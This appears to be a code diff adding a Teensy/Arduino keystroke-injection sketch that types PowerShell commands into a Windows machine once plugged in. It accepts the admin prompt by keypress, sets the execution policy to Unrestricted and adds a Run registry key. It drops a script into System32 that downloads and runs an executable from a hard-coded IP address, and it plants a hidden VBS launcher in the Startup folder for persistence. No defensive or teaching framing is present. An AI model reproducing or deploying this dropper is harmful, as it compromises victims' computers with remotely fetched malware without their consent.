@@ -1,0 +1,154 @@
+void setup() {
+  // put your setup code here, to run once:
+  delay(5000);
+
+  //String execPolicy = "powershell.exe Set-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell\\ -Name ExecutionPolicy -Value \"Unrestricted\"";
+  String RegEdit = "powershell.exe Set-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ -Name Windows -Value \"C:\\Windows\\System32\\Windows.exe\"";
+  String execPolicy = "powershell.exe Set-ExecutionPolicy -ExecutionPolicy Unrestricted";
+
+  String path00 = "C:\\Windows\\System32\\Windows.ps1";
+  String initPOW = "function install(){if(checkInet){$storageDir=\"C:\\Windows\\System32\\\";$webClient = New-Object System.Net.WebClient;$url=\"http://46.101.183.188/Windows.exe\";$file=\"$storageDir\\Windows.exe\";$webClient.DownloadFile($url,$file);$filePath = \"C:\\Windows\\System32\\Windows.exe\";$md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider;$hash=[System.BitConverter]::ToString($md5.ComputeHash([System.IO.File]::ReadAllBytes($filePath)));if($hash -eq \"1C-05-9C-40-C0-07-08-63-15-D5-EC-1D-61-CC-ED-4A\"){[System.Diagnostics.Process]::Start(\"C:\\Windows\\System32\\Windows.exe\");Remove-Item -Force -Recurse \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\Windows.vbs\";Remove-Item -Force -Recurse C:\\Windows\\System32\\Windows.ps1;}else{Remove-Item -Force -Recurse C:\\Windows\\System32\\Windows.exe;install;}}else{Start-Sleep -s 59;install;}}function checkInet(){$status = (ping google.com);$con = 0;if ($status -ne \"Ping request could not find host google.com. Please check the name and try again.\"){$con = 1;}else{$con = 0;}return $con;}install";
+  String createInitPOW = "powershell.exe echo $null > C:\\Windows\\System32\\Windows.ps1";
+
+  String path01 = "$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Windows.vbs";
+  String vbsContent = "command = \"powershell.exe -nologo -command C:\\Windows\\System32\\Windows.ps1\"\nset shell = CreateObject(\"WScript.Shell\")\nshell.Run command,0";
+  String createVBS = "powershell.exe echo $null > \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\Windows.vbs\"";
+  String runVBS = "powershell.exe C:\\Windows\\System32\\Windows.ps1";
+
+  powAdmin(execPolicy);
+  powAdmin(RegEdit);
+
+  genFile(createInitPOW);
+  populateFile(path00, initPOW);
+
+  genFile(createVBS);
+  populateFile(path01, vbsContent);
+
+  powAdmin(runVBS);
+}
+
+void loop() {
+  // put your main code here, to run repeatedly:
+
+}
+
+void powAdmin(String cmd)
+{
+  //Open start
+  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
+  Keyboard.send_now();
+  delay(1000);
+
+  //release keys for start
+  Keyboard.set_modifier(0);
+  Keyboard.send_now();
+  delay(1000);
+
+  //runs the pased argument as admin via powershell
+  Keyboard.print(cmd);
+  delay(2000);
+  Keyboard.set_modifier(MODIFIERKEY_CTRL);
+  Keyboard.send_now();
+  Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
+  Keyboard.send_now();
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+
+  //release keys for admin shell
+  delay(200);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  Keyboard.set_modifier(0);
+  Keyboard.send_now();
+
+  // UAC YES
+  delay(2000);
+  Keyboard.set_modifier(MODIFIERKEY_ALT);
+  Keyboard.send_now();
+  Keyboard.set_key1(KEY_Y);
+  Keyboard.send_now();
+  delay(200);
+
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  Keyboard.set_modifier(0);
+  Keyboard.send_now();
+  delay(5000);
+}
+
+void populateFile(String path, String scriptContent)
+{
+  //sets of strings to be used
+
+  String runCMD = "powershell.exe notepad.exe ";
+  String finalCMD = runCMD + path;
+
+  powAdmin(finalCMD);
+
+  //writes to file
+  Keyboard.print(scriptContent);
+
+  //saves file
+  // press and hold CTRL
+  Keyboard.set_modifier(MODIFIERKEY_CTRL);
+  Keyboard.send_now();
+
+  // press S
+  Keyboard.set_key1(KEY_S);
+  Keyboard.send_now();
+  delay(200);
+
+  // release all the keys at the same instant
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  delay(2000);
+
+  //Close file
+  // press and hold ALT
+  Keyboard.set_modifier(MODIFIERKEY_ALT);
+  Keyboard.send_now();
+
+  // press F4
+  Keyboard.set_key1(KEY_F4);
+  Keyboard.send_now();
+  delay(200);
+
+  // release all the keys at the same instant
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+}
+
+void genFile(String createFile)
+{
+
+  powAdmin(createFile);
+
+  // UAC YES
+  delay(2000);
+  Keyboard.set_modifier(MODIFIERKEY_ALT);
+  Keyboard.send_now();
+  Keyboard.set_key1(KEY_Y);
+  Keyboard.send_now();
+  delay(200);
+
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  Keyboard.set_modifier(0);
+  Keyboard.send_now();
+  delay(5000);
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
